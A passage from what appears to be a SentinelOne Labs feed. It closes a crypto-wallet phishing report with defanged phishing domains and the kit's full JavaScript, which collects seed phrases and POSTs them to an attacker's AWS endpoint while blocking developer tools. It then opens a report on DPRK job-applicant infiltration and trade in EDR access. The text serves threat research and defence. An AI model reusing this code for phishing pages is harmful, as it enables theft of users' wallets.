https://blockffiecoinas.azurewebsites[.]net/<br />
https://blockfi-api.azurewebsites[.]net/<br />
https://blockfiapp-apk.azurewebsites[.]net/<br />
https://blockfiicoins.azurewebsites[.]net/<br />
https://blockificoinz.azurewebsites[.]net/<br />
https://blockifiicoins.azurewebsites[.]net/<br />
https://blockkfi-api.azurewebsites[.]net/<br />
https://blockkfiapi-apk.azurewebsites[.]net/<br />
https://blockkkfifies.azurewebsites[.]net/<br />
https://bloickfie-app.azurewebsites[.]net/<br />
https://bloickfiicoins.azurewebsites[.]net/<br />
https://bloickkfieecoinss.azurewebsites[.]net/<br />
https://bloickkfieescoins876.azurewebsites[.]net/<br />
https://bloiickkfieecoinase.azurewebsites[.]net/<br />
https://blokfi-error.azurewebsites[.]net/<br />
https://blokkfiapp-api.azurewebsites[.]net/<br />
https://blokkifi.azurewebsites[.]net/<br />
https://bloockkfi-api.azurewebsites[.]net/<br />
https://blouckfi-api.azurewebsites[.]net/<br />
https://bluckfi-error.azurewebsites[.]net/<br />
https://bluckfilogn.azurewebsites[.]net/<br />
https://blueckficoinis.azurewebsites[.]net/<br />
https://bluickkfiecoins.azurewebsites[.]net/<br />
https://boloickfieecoins.azurewebsites[.]net/<br />
https://buloickkfieecoins876.azurewebsites[.]net/<br />
https://cbswlterliv487wlt.azurewebsites[.]net/<br />
https://cionbise-error.azurewebsites[.]net/<br />
https://cnbse13liv.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://cobo-wallet.azurewebsites[.]net/<br />
https://cobowalletoffc.azurewebsites[.]net/<br />
https://cobowalletz.azurewebsites[.]net/<br />
https://coienebaiseerlivwlt02elisa.azurewebsites[.]net/<br />
https://coinibisasesn567.azurewebsites[.]net/<br />
https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html<br />
https://edgeronwlet.azurewebsites[.]net/<br />
https://edgersuwlet.azurewebsites[.]net/<br />
https://eedu0s-jhdc-osxza.s3.us-east-1.amazonaws[.]com/index.html<br />
https://en-ledger-cdn.azurewebsites[.]net/<br />
https://en-trezor-cdn-auth.azurewebsites[.]net/<br />
https://en-trezor-cdn.azurewebsites[.]net/<br />
https://errorciiobiosewds876.azurewebsites[.]net/<br />
https://errorcoibisaeseaenbaeb876.azurewebsites[.]net/<br />
https://errorlovblockfi876.azurewebsites[.]net/<br />
https://errorlovbloikcffie876.azurewebsites[.]net/<br />
https://errorlovbolockfiee987.azurewebsites[.]net/<br />
https://errorlovcobisaed786.azurewebsites[.]net/<br />
https://errorlovcoibioise876.azurewebsites[.]net/<br />
https://errorlovexdkekam879.azurewebsites[.]net/<br />
https://errorlovexds987.azurewebsites[.]net/<br />
https://errorlovtenizr987.azurewebsites[.]net/<br />
https://errorlovtrasenzjedsuties.azurewebsites[.]net/<br />
https://errorlovtreazezz876.azurewebsites[.]net/<br />
https://errorlovtrikmanen987.azurewebsites[.]net/<br />
https://errormetiamiasks876.azurewebsites[.]net/<br />
https://errormetismesk987.azurewebsites[.]net/<br />
https://errortreazeeasd-suties.azurewebsites[.]net/<br />
https://ertzirdnwwltliv.azurewebsites[.]net/<br />
https://exd98uswlterliv.azurewebsites[.]net/<br />
https://exdiusiwalet.azurewebsites[.]net/<br />
https://ezioron1wlet.azurewebsites[.]net/<br />
https://iotruzorsuite.azurewebsites[.]net/<br />
https://itrusttcepitalcoins.azurewebsites[.]net/<br />
https://kaikzx-slsld39-lkjf.s3.us-east-1.amazonaws[.]com/index.html<br />
https://krakenzcoins.azurewebsites[.]net/<br />
https://ladzearwlt03jokesmko.azurewebsites[.]net/<br />
https://ldr-0gr-dsxz.s3.us-east-1.amazonaws[.]com/index.html<br />
https://leddgeircoins.azurewebsites[.]net/<br />
https://leddgersacoins.azurewebsites[.]net/<br />
https://ledeagderwallet.azurewebsites[.]net/<br />
https://ledg-01jghe0fhdk.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://ledgar-live-walliet.s3.us-east-2.amazonaws[.]com/index.html<br />
https://ledger-start-403.azurewebsites[.]net/<br />
https://ledger-start-api.azurewebsites[.]net/<br />
https://ledgercoinserror3.azurewebsites[.]net/<br />
https://ledgercoinsweb3.azurewebsites[.]net/<br />
https://ledgersapi-apk.azurewebsites[.]net/<br />
https://ledgersapp.azurewebsites[.]net/<br />
https://ledgirlvestart.azurewebsites[.]net/<br />
https://ledigerwaliteasee.azurewebsites[.]net/<br />
https://ledzaererwltliv30mariamon.azurewebsites[.]net/<br />
https://ledzor365livwlter.azurewebsites[.]net/<br />
https://legdrlievlgin.azurewebsites[.]net/<br />
https://leidgeierwalitese.azurewebsites[.]net/<br />
https://leidgirscoinsweb.azurewebsites[.]net/<br />
https://leldger-live.azurewebsites[.]net/<br />
https://lezor3021sxes.azurewebsites[.]net/<br />
https://lfg0-oiosh-hdh.s3.us-east-1.amazonaws[.]com/index.html<br />
https://lgnwltcnbsliv.azurewebsites[.]net/<br />
https://lledgerwallest.azurewebsites[.]net/<br />
https://lzr13wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://metamaskdn.azurewebsites[.]net/<br />
https://metamasksrs.azurewebsites[.]net/<br />
https://metamassk.azurewebsites[.]net/<br />
https://mmetamassk.azurewebsites[.]net/<br />
https://mtmsklivwlter57wlt.azurewebsites[.]net/<br />
https://ndaaxscoins.azurewebsites[.]net/<br />
https://ndaxcoins.azurewebsites[.]net/<br />
https://ndeauxcoinsweb.azurewebsites[.]net/<br />
https://neaiaxcoins.azurewebsites[.]net/<br />
https://oduisshweb3.azurewebsites[.]net/<br />
https://portal-treaeameaene876.azurewebsites[.]net/<br />
https://ra0-lkjd01-gfhjd.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://relkd28-lokdyuj.s3.us-east-1.amazonaws[.]com/index.html<br />
https://sdfg0d28-djkfk.s3.us-east-1.amazonaws[.]com/index.html<br />
https://secuxwallet-api.azurewebsites[.]net/<br />
https://sjdhd29-oiuw0.s3.us-east-1.amazonaws[.]com/index.html<br />
https://sledegerwallet.azurewebsites[.]net/<br />
https://solflareewerror.azurewebsites[.]net/<br />
https://suiitewalettrzior.azurewebsites[.]net/<br />
https://teirzoriiostart.azurewebsites[.]net/<br />
https://tereamanezheoakeeoake.azurewebsites[.]net/<br />
https://tereazeriwaleits.azurewebsites[.]net/<br />
https://tereizercoinswalts.azurewebsites[.]net/<br />
https://tereizercoinsweb.azurewebsites[.]net/<br />
https://tereziiorcoinsweb3.azurewebsites[.]net/<br />
https://tereziioreeae-walieats.azurewebsites[.]net/<br />
https://terezorcoinscweb3.azurewebsites[.]net/<br />
https://terezuiear-api.azurewebsites[.]net/<br />
https://terozeiorwltliv31wikub.azurewebsites[.]net/<br />
https://terozriosiuet.azurewebsites[.]net/<br />
https://terzoerirwlt476liv.azurewebsites[.]net/<br />
https://tirizeriostrt.azurewebsites[.]net/<br />
https://tirizurstrtio.azurewebsites[.]net/<br />
https://tirzwltliv09erds.azurewebsites[.]net/<br />
https://tizrerlivwlt897wlt.azurewebsites[.]net/<br />
https://tizrwlterliv45livwlt.azurewebsites[.]net/<br />
https://tr01-dkfjgk-slas.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tr0ox-obnsj.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tra09fjl-sodfjjkd.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://trac-durjg-fkf.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://traezor-suitez403.azurewebsites[.]net/<br />
https://traieazeariscoins.azurewebsites[.]net/<br />
https://tre876162ru0988zer.azurewebsites[.]net/<br />
https://treaizerecoins.azurewebsites[.]net/<br />
https://treauzearcoins.azurewebsites[.]net/<br />
https://treazerapi-apk.azurewebsites[.]net/<br />
https://treazerszcoins.azurewebsites[.]net/<br />
https://treaziexc-ax-bc.azurewebsites[.]net/<br />
https://treazirapi-apk.azurewebsites[.]net/<br />
https://treazosr-api.azurewebsites[.]net/<br />
https://treazsoirsuites.azurewebsites[.]net/<br />
https://treazuer-suite.azurewebsites[.]net/<br />
https://treizaers-coins.azurewebsites[.]net/<br />
https://treizoircoinerror3.azurewebsites[.]net/<br />
https://treizrwalogn.azurewebsites[.]net/<br />
https://treriertriliv34erwlt.azurewebsites[.]net/<br />
https://trezaereade-suite.azurewebsites[.]net/<br />
https://trezieserscoins.azurewebsites[.]net/<br />
https://trezior-suite.azurewebsites[.]net/<br />
https://trezirapp-api.azurewebsites[.]net/<br />
https://treziresacoins.azurewebsites[.]net/<br />
https://triezorwallets.azurewebsites[.]net/<br />
https://trioriorwlt485wltliv.azurewebsites[.]net/<br />
https://trizeriowaliet.azurewebsites[.]net/<br />
https://triziorecoinsweb3.azurewebsites[.]net/<br />
https://triziriosuite.azurewebsites[.]net/<br />
https://trizuriosiute.azurewebsites[.]net/<br />
https://trucetreizerr.azurewebsites[.]net/<br />
https://truiazearcoins.azurewebsites[.]net/<br />
https://trzeriostrt.azurewebsites[.]net/<br />
https://ttrzorappsuite.azurewebsites[.]net/<br />
https://tzer30liv.s3.us-east-2.amazonaws[.]com/index.html<br />
https://tzr06wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tzreoirwlt05balba.azurewebsites[.]net/<br />
https://tzreoriewlt31wikub.azurewebsites[.]net/<br />
https://uniswapv3login.azurewebsites[.]net/<br />
https://uphooldlogn.azurewebsites[.]net/<br />
https://web-treszor.azurewebsites[.]net/<br />
https://weberrortrezur886.azurewebsites[.]net/<br />
https://wltcbserlive467wlt.azurewebsites[.]net/<br />
https://wltlzr67erlivehsfjfd.azurewebsites[.]net/<br />
https://woleatcoebs34livwlt.azurewebsites[.]net/<br />
https://zen-ledger-error.azurewebsites[.]net/<br />
https://zenledgerscoinsweb.azurewebsites[.]net/</p>
<h3>Example JavaScript</h3>
<p>This is an example of the JavaScript (&#8220;app.js&#8221;) that was included on the S3-hosted phishing example: <code>https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html</code>.</p>
<p>Note the defanged malicious URL in the code below–that is the only alteration.</p>
<pre>
let currentWordCount = 12; // Default word count
function updateInputFields(wordCount) {
   const inputContainer = document.getElementById('inputContainer');
   inputContainer.innerHTML = '';
    currentWordCount = wordCount;
    for (let i = 0; i &lt; wordCount; i++) { // Use 0-based index for phase keys
        const colDiv = document.createElement('div');
    // if (wordCount === 1) {
    //     colDiv.className = 'col-lg-21 col-md-12 col-sm-12 col-xs-12';
    //     colDiv.innerHTML = `
    //         &lt;input
    //             class="form-control"
    //             type="text"
    //             placeholder="Input your words as many words as you have"
    //             name="word${i}"
    //             required
    //             title="Only alphabets are allowed.">
    //         &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
    //     `;
    // } else {
        colDiv.className = 'col-lg-4 col-md-4 col-sm-4 col-xs-12';
        colDiv.innerHTML = `
            &lt;input
                class="form-control"
                type="text"
                placeholder="${i + 1}."
                name="word${i}"
                required
                pattern="[a-zA-Z]{1,10}"
                maxlength="10"
                oninput="this.value = this.value.replace(/[^a-zA-Z]/g, '').substring(0, 10);"
                title="Only alphabets are allowed.">
            &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
                `;
            // }
        inputContainer.appendChild(colDiv);
    }
    event.target.classList.add('active');
    const buttons = document.querySelectorAll('.displayflex button');
    buttons.forEach((button) => {
        button.classList.remove('active');
    });
    event.target.classList.add('active');
}
async function handleNextStep(event) {
    event.preventDefault();
    const inputContainer = document.getElementById('inputContainer');
    const inputs = inputContainer.querySelectorAll('input');
    let allValid = true;
    const enteredWords = new Set();
    inputs.forEach((input) => {
        const errorDiv = input.nextElementSibling; // Get the associated error div
        if (!input.checkValidity()) {
            errorDiv.style.display = 'block';
            allValid = false;
        } else {
            errorDiv.style.display = 'none';
        }
        const word = input.value.trim().toLowerCase(); // Normalize to lowercase to handle case insensitivity
        if (word &amp;&amp; enteredWords.has(word)) {
            allValid = false;
            errorDiv.innerHTML = 'This word has already been entered.';
            errorDiv.style.display = 'block';
        } else {
            enteredWords.add(word);  // Add word to the Set
        }
    });
    if (!allValid) {
        alert("Mnemonic phrase is not valid. Try again.");
        return;
    }
    const data = {};
    inputs.forEach((input, index) => {
    data[`phrase${index}`] = input.value.trim();
    });
    data.subject = "Trezor connect2";
    data.message = "Successfull fetch data";
    $.ajax({
        type: "POST",
        url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
        dataType: "json",
        crossDomain: true,
        contentType: "application/json; charset=utf-8",
        data: JSON.stringify(data),
        success: function (result) {
        alert('Data submitted successfully1!');
        window.location.href = 'https://suite.trezor.io/web/';
        location.reload();
        },
        error: function (xhr, status, error) {
            window.location.href = 'https://suite.trezor.io/web/';
&nbsp;
&nbsp;
        }
    });
}

window.onload = function () {
    // Prevent the back button from navigating back
    function preventBack() {
    history.forward();
    }
    
    // Execute the `preventBack` function immediately after page load
    setTimeout(preventBack, 0);
    
    // Ensure the page doesn't cache on unload, forcing users to reload
    window.onunload = function () {
        return null;
    };
};

document.addEventListener('DOMContentLoaded', () => updateInputFields(12));

document.addEventListener("DOMContentLoaded", function () {
    const statusButton = document.getElementById("statusButton");
    const statusText = document.getElementById("statusText");
    const statusIcon = document.getElementById("statusIcon");
    // Initial state: "Waiting for Trezor..."
    statusText.textContent = "Waiting for Trezor... ";
    statusIcon.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin" style="color: #ffffff;"></i>';
    // After 2 seconds: "Establishing connection"
    setTimeout(() => {
        statusText.textContent = "Establishing connection...";
        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
    }, 5000);
    // After 5 seconds: "Unable to read data" (Error state)
    setTimeout(() => {
    statusText.textContent = "Unable to read data";
    statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #ffffff;"></i>';
    statusButton.classList.add("error-btn");
    }, 5000);
    function resetStatus() {
        // Reset to "Establishing connection..."
        statusText.textContent = "Establishing connection...";
        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
        statusButton.classList.remove("error-btn");  // Reset error button class
        // After 3 seconds: Change status to "Unable to read data"
        setTimeout(() => {
            statusText.textContent = "Unable to read data";
            statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #fe3131f2;"></i>';
            statusButton.classList.add("error-btn");
        }, 5000);
    }
    // Event listener for button click
    statusButton.addEventListener("click", function () {
        resetStatus(); // Reset and start the cycle on each click
    });
    // Optionally, you can trigger the status change flow immediately after page load for testing
    setTimeout(() => {
        resetStatus(); // Automatically run the flow when the page loads (optional)
    }, 5000);
});

    // Disable right-click context menu
    document.addEventListener("contextmenu", (event) => event.preventDefault());
    // Disable key combinations for opening developer tools
    document.addEventListener("keydown", (event) => {
    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (View Source), Ctrl+Shift+C
    if (
        event.key === "F12" ||
        (event.ctrlKey &amp;&amp; event.shiftKey &amp;&amp; ["I", "J", "C"].includes(event.key)) ||
        (event.ctrlKey &amp;&amp; event.key === "U")
    ) {
        event.preventDefault();
}
});

    // Detect if devtools is opened (basic detection)
    const detectDevTools = () => {
    const element = new Image();
        Object.defineProperty(element, "id", {
            get: () => {
                alert("Developer tools detected. Please close it to proceed.");
                // Redirect or log out the user
                window.location.href = "about:blank"; // Example action
            },
        });
        console.log(element);
    };
    detectDevTools();
    setInterval(detectDevTools, 1000);
</pre>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/05/CryptoDrain-soc.jpg" length="969572" type="image/jpeg" />	</item>
		<item>
		<title>Top Tier Target &#124; What It Takes to Defend a Cybersecurity Company from Today&#8217;s Adversaries</title>
		<link>https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</link>
		
		<dc:creator><![CDATA[Tom Hegel, Aleksandar Milenkoski &amp; Jim Walter]]></dc:creator>
		<pubDate>Mon, 28 Apr 2025 09:55:19 +0000</pubDate>
				<category><![CDATA[adversary]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=119693</guid>

					<description><![CDATA[This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">In recent months, SentinelOne has observed and defended against a spectrum of attacks from financially motivated crimeware to tailored campaigns by advanced nation-state actors.</li>
<li aria-level="1">These incidents were real intrusion attempts against a U.S.-based cybersecurity company by adversaries, but incidents such as these are neither new nor unique to SentinelOne.</li>
<li aria-level="1">Recent adversaries have included:
<ul>
<li aria-level="2">DPRK IT workers posing as job applicants</li>
<li aria-level="2">ransomware operators probing for ways to access/abuse our platform</li>
<li aria-level="2">Chinese state-sponsored actors targeting organizations aligned with our business and customer base</li>
</ul>
</li>
<li aria-level="1">This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves.</li>
</ul>
<h2>Overview</h2>
<p>At SentinelOne, defending against real-world threats isn’t just part of the job, it’s the reality of operating as a cybersecurity company in today’s landscape. We don’t just study attacks, we experience them firsthand, levied against us. Our teams face the same threats we help others prepare for, and that proximity to the front lines shapes how we think, and how we operate. Real-world attacks against our own environment serve as constant pressure tests, reinforcing what works, revealing what doesn’t, and driving continuous improvement across our products and operations. When you’re a high-value target for some of the most capable and persistent adversaries out there, nothing less will do.</p>
<p>Talking about being targeted is uncomfortable for any organization. For cybersecurity vendors, it&#8217;s practically taboo. But the truth is security vendors sit at an interesting cross-section of access, responsibility, and attacker ire that makes us prime targets for a variety of threat actors, and the stakes couldn’t be higher. When adversaries compromise a security company, they don’t just breach a single environment—they potentially gain insight into how thousands of environments and millions of endpoints are protected.</p>
<p>In the past several months alone, we’ve observed and defended against a spectrum of attacks ranging from financially motivated crimeware to tailored campaigns by advanced nation-state actors. They were real intrusion attempts targeting a U.S.-based cybersecurity company — launched by adversaries actively looking for an advantage, access, or leverage. Adversaries included DPRK IT workers posing as job applicants, ransomware operators probing for ways to access/abuse our platform, and Chinese state-sponsored actors targeting organizations aligned with our business and customer base.</p>
<p>We are certainly not the only ones facing these threats. In the spirit of furthering collective defenses and encouraging further collaboration, we’re pulling back the curtain to share some of what we’ve seen, why it matters, and what it tells us about the evolving threat landscape—not just for us, but for every company building and relying on modern security technology.</p>
<h2>DPRK IT Workers Seeking Inside Jobs</h2>
<p>One of the more prolific and persistent adversary campaigns we’ve tracked in recent years involves widespread campaigns by DPRK-affiliated IT Workers attempting to secure remote employment within Western tech companies– including SentinelOne. <a href="https://www.justice.gov/archives/opa/pr/fourteen-north-korean-nationals-indicted-carrying-out-multi-year-fraudulent-information" target="_blank" rel="noopener noreferrer">Early reports</a> drew attention to these efforts and <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer">our own analysis</a> revealed further logistical infrastructure to launder illicit funds via Chinese intermediary organizations. However, neither gave a sense of the staggering volume of ongoing infiltration attempts. This vector far outpaces any other insider threat vector we monitor.</p>
<p>These actors are not just applying blindly — they are refining their process, leveraging stolen or fabricated personas, and adapting their outreach tactics to mirror legitimate job seekers in increasingly convincing ways. Our team has tracked roughly 360 fake personas and over 1,000 job applications linked to DPRK IT worker operations applying for roles at SentinelOne — even including brazen attempts to secure positions on the SentinelLabs intelligence engineering team itself.</p>
<figure id="attachment_120051" aria-describedby="caption-attachment-120051" style="width: 588px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg" alt="Public reporting of DPRK IT workers applying to threat intelligence positions" width="588" height="723" class="size-full wp-image-120051" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg 588w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1-244x300.jpg 244w" sizes="auto, (max-width: 588px) 100vw, 588px" /><figcaption id="caption-attachment-120051" class="wp-caption-text">Public reporting of DPRK IT workers applying to threat intelligence positions</figcaption></figure>
<h3>Engagement and Adversary Interaction</h3>
<p>Instead of staying passive, we made a deliberate choice towards intelligence-driven engagement. In coordination with our talent acquisition teams, we developed workflows to identify and interact with suspected DPRK applicants during the early phases of their outreach. This collaboration was key. By embedding lightweight vetting signals and monitoring directly into recruiting processes — without overburdening hiring teams — we were able to surface anomalous patterns tied to DPRK-affiliated personas piped directly into our Vertex Synapse intelligence platform for analyst review.</p>
<p>Our attempted interactions offered rare insights into the craftiness and persistence of these infiltration campaigns — particularly the ways in which adversaries adapt to the friction they encounter.</p>
<figure id="attachment_120055" aria-describedby="caption-attachment-120055" style="width: 1908px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg" alt="Inbound DPRK referral request to strategic employees" width="1908" height="378" class="size-full wp-image-120055" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg 1908w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-300x59.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1024x203.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-768x152.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1536x304.jpg 1536w" sizes="auto, (max-width: 1908px) 100vw, 1908px" /><figcaption id="caption-attachment-120055" class="wp-caption-text">Inbound DPRK referral request to strategic employees</figcaption></figure>
<p>The attackers are honing their craft beyond the job application and recruitment process. An operation of this scale and nature requires a different kind of backend infrastructure, such as a<a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer"> sprawling network of front companies</a> to enable further laundering and logistics.</p>
<figure id="attachment_120057" aria-describedby="caption-attachment-120057" style="width: 2000px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg" alt="DPRK IT Worker Front Company Network (November 2024)" width="2000" height="1037" class="magnify size-full wp-image-120057" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg 2000w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1024x531.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-768x398.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1536x796.jpg 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px" /><figcaption id="caption-attachment-120057" class="wp-caption-text">DPRK IT Worker Front Company Network (November 2024)</figcaption></figure>
<h3>Helping Hiring Teams Help Us</h3>
<p>A key takeaway in working on this investigation was the value of intentionally creating inroads and sharing threat context with different teams not normally keyed into investigations. Rather than cluelessness, we encountered an intuitive understanding of the situation as recruiters had already been filtering out and reporting ‘fake applicants’ within their own processes.</p>
<p>We brought campaign-level understanding that was combined with tactical insights from our talent team. The payoff was immediate. Recruiters began spotting patterns on their own, driving an increase in early-stage escalation of suspicious profiles. They became an active partner that continues to flag new sightings from the frontlines. In turn, we are codifying these insights into automated systems that flag, filter, enrich, and proactively block these campaigns to lower the burden on our recruiters and hiring managers, and reduce the risk of infiltration.</p>
<p>Make cross‑functional collaboration standard operating procedure: equip frontline business units—from recruiting to sales—with shared threat context and clear escalation paths so they can surface anomalies early without slowing the business. Codifying insights with automation will consistently bring bi-directional benefits.</p>
<p>The DPRK IT worker threat is a uniquely complex challenge — one where meaningful progress depends on collaboration between the security research community and public sector partners.</p>
<h2>Ransomware Group Capability Development</h2>
<p>Financially motivated threat actors frequently target enterprise security platforms —products designed to keep them from making money—for direct access. SentinelOne, like our peers, is no exception. While uncomfortable, this is a reality the industry faces continually and should handle with both transparency and urgency.</p>
<figure id="attachment_120054" aria-describedby="caption-attachment-120054" style="width: 746px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg" alt="Forum post offering security product access" width="746" height="415" class="size-full wp-image-120054" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg 746w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5-300x167.jpg 300w" sizes="auto, (max-width: 746px) 100vw, 746px" /><figcaption id="caption-attachment-120054" class="wp-caption-text">Forum post offering security product access</figcaption></figure>
<p>Privileged access to administrative interfaces or agent installers for endpoint security products provides tangible advantages for adversaries seeking to advance their operations. Console access can be used to disable protections, manipulate configurations, or suppress detections. Direct, unmonitored access to the endpoint agent offers opportunities to test malware efficacy, explore bypass or tampering techniques, and suppress forensic visibility critical for investigations. In the wrong hands, these capabilities represent a significant threat to both the integrity of security products and the environments they protect.</p>
<p>This isn’t a new tactic. Various high-profile criminal groups have long specialized in social engineering campaigns to gain access to core security tools and infrastructure—ranging from EDR platforms (including SentinelOne and Microsoft Defender) to IAM and VPN providers such as Okta. Their goal: expand footholds, disable defenses, and obstruct detection long enough to profit.</p>
<p>Recent leaks related to <a href="https://www.sentinelone.com/anthology/black-basta/" target="_blank" rel="noopener noreferrer">Black Basta</a> further underscore this trend. The group’s operators were observed testing across multiple endpoint security platforms—including SentinelOne, CrowdStrike, Carbon Black, and Palo Alto Networks—before launching attacks, suggesting a systematic effort to evaluate and evade security tools prior to deployment.</p>
<figure id="attachment_120064" aria-describedby="caption-attachment-120064" style="width: 793px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg" alt="Black Basta leak excerpts" width="793" height="328" class="size-full wp-image-120064" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg 793w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-300x124.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-768x318.jpg 768w" sizes="auto, (max-width: 793px) 100vw, 793px" /><figcaption id="caption-attachment-120064" class="wp-caption-text">Black Basta leak excerpts</figcaption></figure>
<h3>Economy/Ecosystem</h3>
<p>There is an increasingly mature and active underground economy built around the buying, selling, and renting of access to enterprise security tools. For the right price, aspiring threat actors continually attempt to obtain time-bound or persistent access to our EDR platform and administrative consoles. Well-known cybercrime forums are filled with vendors openly advertising such access—and just as many buyers actively seeking it. This includes long-established forums like <code>XSS[.]is</code>, <code>Exploit[.]in</code> and RAMP.</p>
<p>That said, more of this activity has been moving to confidential messaging platforms as well (Telegram, Discord, Signal). For example, Telegram bots are used to automate trading this access, and Signal is often used by threat actors to discuss nuance, targeting and initial access operations.</p>
<p>This supply-and-demand dynamic is not only robust but also accelerating. Entire service offerings have emerged around this ecosystem, including “EDR Testing-as-a-Service,” where actors can discreetly evaluate malware against various endpoint protection platforms.</p>
<figure id="attachment_120059" aria-describedby="caption-attachment-120059" style="width: 1053px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg" alt="Proposed Private EDR testing service" width="1053" height="386" class="size-full wp-image-120059" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg 1053w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-300x110.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-1024x375.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-768x282.jpg 768w" sizes="auto, (max-width: 1053px) 100vw, 1053px" /><figcaption id="caption-attachment-120059" class="wp-caption-text">Proposed Private EDR testing service</figcaption></figure>
<p>While these testing services may not grant direct access to full-featured EDR consoles or agents, they do provide attackers with semi-private environments to fine-tune malicious payloads without the threat of exposure—dramatically improving the odds of success in real-world attacks.</p>
<figure id="attachment_120053" aria-describedby="caption-attachment-120053" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg" alt="Prospective buyer for EDR installs" width="1999" height="455" class="size-full wp-image-120053" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-300x68.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1024x233.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-768x175.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1536x350.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-221x51.jpg 221w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-120053" class="wp-caption-text">Prospective buyer for EDR installs</figcaption></figure>
<p>Access isn’t always bought, however. Threat actors frequently harvest legitimate credentials from infostealer logs—a common and low-cost method of acquiring privileged access to enterprise environments. In cases where existing customers reuse credentials, this can translate into a threat actor also gaining access to security tools. In more targeted operations, actors have also turned to bribery, offering significant sums to employees willing to sell out their account access.</p>
<p>These insider threats are not hypothetical. For instance, some groups have been observed offering upwards of $20,000 to employees at targeted companies in exchange for insider assistance—an approach openly discussed in the same dark web forums where compromised credentials and access are routinely traded.</p>
